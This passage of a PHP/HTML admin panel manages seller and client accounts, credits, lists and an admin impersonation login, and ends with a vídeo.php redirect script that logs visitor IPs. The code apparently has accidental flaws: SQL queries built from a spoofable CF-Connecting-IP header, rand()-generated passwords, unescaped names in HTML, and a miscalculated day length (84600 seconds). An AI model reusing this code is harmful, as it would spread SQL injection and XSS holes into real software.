        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                <input type="hidden" id="idE" name="id">
			   <?php if($_SESSION['vendedor']) { ?>
               <input id="master" name="master" type="hidden" value="0">
               <?php } ?>
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" id="nomeE" name="nome" placeholder="Nome">
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" id="loginE" name="login" placeholder="Login">
                </div>
                <div id="s">
                <div id="divSenha" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" id="SenhaE" name="senha" placeholder="Senha">
                    </div>
                </div>
                <?php if($_SESSION['vendedor']) { ?>
                <div class="form-group">
                    <label>Máximo de Créditos:</label>
                    <input type="number" class="form-control" id="CreditoE" name="credito">
               </div>
               <?php } ?>
               <div class="form-group">
                    <label>Estado:</label>
                    <div class="ml-0 row">
                        <select id="estadoE" class="selectpicker" title="Estado" name="estado">
                            <option value="1">Ativo</option>
                            <option value="0">Desativado</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelE" class="selectpicker" title="Nível">
                            <?php if($_SESSION['vendedor']) { ?>
						    <option value="admin" hidden></option>
                            <option value="vendedor">Vendedor</option>
							<option value="cliente" hidden></option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select id="adminE" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select id="vendedorE" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista" class="selectpicker" title="Listas" multiple>
                <?php if ($listas) { 
                    foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="forceEdit()" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
<?php } ?>
<?php } ?>
<?php if($_SESSION['admin']) { ?>
<!-- Cadastro Inicio -->
<div class="modal fade" id="cadastro" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="TituloModalLongoExemplo">Adicionar Vendedor</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="cadastro-form">
            <div class="container">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" name="nome" placeholder="Nome" value="<?php $gerador = rand(8,8); $valor = substr(str_shuffle("abcdefghijlkmnopqrstuvxyzwABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $gerador); echo $valor; ?>">
                    <small class="form-text text-muted">Deixa gerar um nome automático se não quiser colocar</small>
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" name="login" placeholder="Login" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar um login automático se não quiser colocar</small>
                </div>
                <div id="sC">
                    <div id="divSenhaC" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" name="senha" placeholder="Senha" value="<?php echo rand(1,999999);?>">
                    <small class="form-text text-muted">Deixa gerar uma senha automático se não quiser colocar</small>
                </div>
                </div>
              <?php if($_SESSION['admin']) { ?>
                <div class="form-group">
                    <label>Máximo de Créditos:</label>
                    <input type="number" class="form-control" name="credito" value="0">
               </div>
             <?php } ?>
              <?php if($_SESSION['admin']) { ?>
                <div class="form-group">
                    <label>Sub Vendedor:</label>
                    <div class="ml-0 row">
                        <select id="master" name="master" class="selectpicker">
						    <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
             <?php } ?>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelC" class="selectpicker" title="Nível">
                            <?php if($_SESSION['admin']) { ?>
						    <option value="admin" hidden></option>
                            <option value="vendedor">Vendedor</option>
							<option value="cliente" hidden></option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select value="0" id="adminC" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select value="0" id="vendedorC" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista[]" class="selectpicker" title="Listas" multiple>
                <?php if ($listas) { 
                    foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="addForce()" class="btn btn-danger">Adicionar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Cadastro Fim-->
<?php } ?>
<?php if($_SESSION['admin']) { ?>
<!-- Remove Inicio -->
<div class="modal fade" id="remover" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Tem certeza?</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div id="remover-conteudo" class="modal-body"></div>
    </div>
  </div>
</div>
<!-- Remove Fim-->
<?php } ?>
<?php if($_SESSION['admin']) { ?>
<!-- Edita Inicio -->
<div class="modal fade" id="editar" tabindex="-1" role="dialog" aria-labelledby="Cadastrar" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Editar Vendedor</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form id="editar-form">
            <div class="container">
                <input type="hidden" id="idE" name="id">
                <div class="form-group">
                    <label>Nome:</label>
                    <input type="text" class="form-control" id="nomeE" name="nome" placeholder="Nome">
                </div>
                <div class="form-group">
                    <label>Login:</label>
                    <input type="text" class="form-control" id="loginE" name="login" placeholder="Login">
                </div>
                <div id="s">
                <div id="divSenha" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" id="SenhaE" name="senha" placeholder="Senha">
                    </div>
                </div>
              <?php if($_SESSION['admin']) { ?>
                <div class="form-group">
                    <label>Máximo de Créditos:</label>
                    <input type="number" class="form-control" id="CreditoE" name="credito">
               </div>
             <?php } ?>
              <?php if($_SESSION['admin']) { ?>
                <div class="form-group">
                    <label>Sub Vendedor:</label>
                    <div class="ml-0 row">
                    <select id="MasterE" class="selectpicker" name="master">
						    <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
             <?php } ?>
               <div class="form-group">
                    <label>Estado:</label>
                    <div class="ml-0 row">
                        <select id="estadoE" class="selectpicker" title="Estado" name="estado">
                            <option value="1">Ativo</option>
                            <option value="0">Desativado</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelE" class="selectpicker" title="Nível">
                            <?php if($_SESSION['admin']) { ?>
						    <option value="admin" hidden></option>
                            <option value="vendedor">Vendedor</option>
							<option value="cliente" hidden></option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select id="adminE" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select id="vendedorE" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Listas:</label>
                    <div class="ml-0 row">
                        <select name="lista" class="selectpicker" title="Listas" multiple>
                <?php if ($listas) { 
                    foreach ($listas as $lista) {?>
                        <option value="<?=$lista['id_lista']?>"><?=$lista['nome_lista']?></option>
                    <?php  } 
                    } ?>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="forceEdit()" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
<?php } ?>
</body>
<script>

    var clone = $("#divSenha").clone();
    var cloneC = $("#divSenhaC").clone();
    //$("#divSenhaC").remove();

    $("#cadastro").on('hidden.bs.modal', function (e) {
        if ($( "#adminC" ).val() != 1) {
            //$("#sC").empty();//DO_NOTHING
        }
    });

    $( "#adminC" ).change(function() {
        if ($( "#adminC" ).val() == 1) {
            $("#sC").append(cloneC);
        } else {
            $("#sC").empty();
        }
    });

    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }

	function remover(id){
        window.location.href = 'controles/remover-usuario.php?id_usuario=' + id;
    }

    function editarConfirma(dia, id,nome,contato,login,estado,admin, vendedor, lista) {
	if(parseInt(dia) > 0){
	   $('#dia').val(parseInt(dia));
	} else {
	   $('#dia').val('');
	}
        $('#idE').val(id);
        $('#nomeE').val(nome);
        $('#nivelE').val(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
        setTimeout(() => {
            $('#nivelE').val(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
            $('*[data-id=nivelE]').text(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
        }, 500);
        $('#CreditoE').val(contato);
        $('#loginE').val(login);
        $('#estadoE').val(estado);
        $('#estadoE').selectpicker('render');
        $('#SenhaE').val(admin);
		$('#MasterE').val(master);
        $('#adminE').selectpicker('render');
        if (parseInt(admin) == 0) {
	    console.log(parseInt(vendedor) !== 1);
	    if(parseInt(vendedor) !== 1){
		$('#exdiaE').show();
	    } else {
		$('#exdiaE').hide();
	    }
            //$('#divSenha').remove();
        } else if ($('#divSenha').length < 1) {
            $('#s').append(clone);
        }
        $('#listaE').val(lista);
        $('#listaE').selectpicker('render');
        $('#editar').modal();
    }

    var addForce = function(){
        $( "#cadastro-form" ).trigger('submit');
    };
    var added = false;
    $( "#cadastro-form" ).submit(function( event ) {
        if(!added){
            added = true;
            if($('#cadastro-form select[name="vendedor"]').val().trim() == ""){
                $('#cadastro-form select[name="vendedor"]').val(0);
            }
            if($('#cadastro-form select[name="admin"]').val().trim() == ""){
                $('#cadastro-form select[name="admin"]').val(0);
            }
            $.ajax({
                type: "POST",
                url: "controles/adicionar-usuario.php",
                data: $("#cadastro-form").serialize(),
                success: function(data) {
                    location.reload();
                },
                error: function(data) {
                  resultado(data.responseText);
                }
            });
        }
        event.preventDefault();
    });
    var eddited = false;
    var forceEdit = function(){
        $( "#editar-form" ).trigger('submit');
    }
    $( "#editar-form" ).submit(function( event ) {
        if(!eddited){
            eddited = true;
            if($('#editar-form select[name="vendedor"]').val().trim() == ""){
                $('#editar-form select[name="vendedor"]').val(0);
            }
            if($('#editar-form select[name="admin"]').val().trim() == ""){
                $('#editar-form select[name="admin"]').val(0);
            }
            $.ajax({
                type: "POST",
                url: "controles/editar-usuario.php",
                data: $("#editar-form").serialize(),
                success: function(data) {
                    location.reload();
                },
                error: function(data) {
                  resultado(data.responseText);
                }
            });
        }
        event.preventDefault();
    });
    <?php if($_SESSION['admin']) { ?>
	  $('#vendedorC').val(0);
      $('#adminC').val(1);
    <?php } ?>

    $('#nivelC').on('change', function(){
       var value = $(this).val();
       $('#sC').empty();
       if(value == 'vendedor'){
           $('#adminC').val(0);
           $('#vendedorC').val(1);
           $("#sC").append(cloneC);
	   $('#exdiaC').hide();
	   $('#ConectadoC').hide();
	   $('#CreditoC').val(1);
       } else if (value == 'admin'){
           $('#adminC').val(1);
           $('#vendedorC').val(0);
           $("#sC").append(cloneC);
	   $('#exdiaC').hide();
	   $('#ConectadoC').hide();
	   $('#CreditoC').val(0);
       } else {
           $('#adminC').val(0);
           $('#vendedorC').val(0);
	   $("#sC").append(cloneC);	   
	   $('#exdiaC').show();
	   $('#ConectadoC').show();
	   $('#CreditoC').val(0);
       }
    });
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}
    function logar(id){
	if(!getCookie('original')){
	   setCookie('original', <?php echo $_SESSION['id_usuario'] ?>, 1);	
	}
	$.get('controles/forcar-login.php?id_usuario=' + id, function(){
	   window.location.reload();
        });
    }
    function verLogs(id){
        window.location.href = 'log.php?id_usuario=' + id;
    }
    $('#nivelE').on('change', function(){
       var value = $(this).val();
       if(value == 'vendedor'){
           $('#adminE').val(0);
           $('#vendedorE').val(1);
           $("#s").append(clone);
	   $('#exdiaE').hide();
       } else if (value == 'admin') {
           $('#adminE').val(1);
           $('#vendedorE').val(0); 
           $("#s").append(clone);
	   $('#exdiaE').hide();
       } else {
           $('#adminE').val(0);
           $('#vendedorE').val(0);
           $("#s").append(clone);
	   $('#exdiaE').show();
       }
    });
    if(window.mobilecheck()){
	$('#checkme').remove();
    }
    $('.thead-light th:not(".nomecol")').remove();
	
</script>
<?php require_once("comum.php"); 
require_once("alerta.php");?>

</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/vídeo.php:
<?php
require_once("controles/links.php");

if (isset($_GET['acesso']) && isset($_GET['usuario'])) {
    $acesso = $_GET['acesso'];
    $usuario = $_GET['usuario'];
    if ($usuario !== "") {
        if ($data = buscarLink($usuario, $acesso)) {
            $usuario = buscarUsuario($usuario);
		    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
			$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
			}
			$ip = $_SERVER["REMOTE_ADDR"];
            $buscar = ("SELECT * FROM logs WHERE id_usuario = ".$usuario['id_usuario']." AND ip = '$ip' limit 1");
            $resut = mysqli_query($conexao, $buscar);
            $total = mysqli_num_rows($resut);
            $nome = $data['nome_link'];
            $logo = $data['logo'];
            $date = date('d/m/Y H:i:s');
            $ip = $_SERVER['REMOTE_ADDR'];
			$conexao1 = $total;
            $conexao2 = $usuario['conectado'];

            criarLog($usuario['id_usuario'], $nome, $logo, $ip, $date);	
            if($conexao1 <= $conexao2){
			 header("Location: ".$data['link_link']."");
		    } else {
             header("HTTP/1.0 404 Not Found");
			}
        } else {
            header("HTTP/1.0 404 Not Found");
        }
    } else {
        header("HTTP/1.0 404 Not Found");
    }
} else {
    header("HTTP/1.0 404 Not Found");
}
?>
<?php
$hoje = date('Y-m-d');
$data = $usuario['data'];
$a = explode("-","$data");
$b = explode("-","$hoje");
$antiga= mktime(0, 0, 0, $b[1], $b[2], $b[0]);
$atual= mktime(0, 0, 0, $a[1], $a[2], $a[0]);
$diferenca= $atual-$antiga;
$datas = floor($diferenca/84600);
$data1 = "1";
$data2 = $datas;
if($data1 <= $data2){
} else {
$acesso = $usuario['acesso'];
$estado = "0";
$tipo = "0";
$result = "UPDATE usuario SET vendedor='$tipo', admin='$tipo', estado_usuario='$estado' WHERE acesso='$acesso'";
$atualiza = mysqli_query($conexao, $result);}
?>
